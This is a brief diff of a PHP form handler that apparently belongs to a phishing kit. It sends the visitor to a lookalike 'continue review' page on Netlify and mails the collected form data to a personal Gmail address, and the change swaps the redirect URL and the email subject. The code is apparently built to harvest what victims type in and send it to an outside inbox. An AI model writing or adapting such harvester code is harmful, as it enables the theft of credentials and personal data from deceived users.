@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://about-our-policies.vercel.app/");
+header("Location:https://continue-review-h.netlify.app/confrim.html");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ $mail->addAddress('asif@gmail.com');
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'asif';
+        $mail->Subject = 'tufailaziz';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
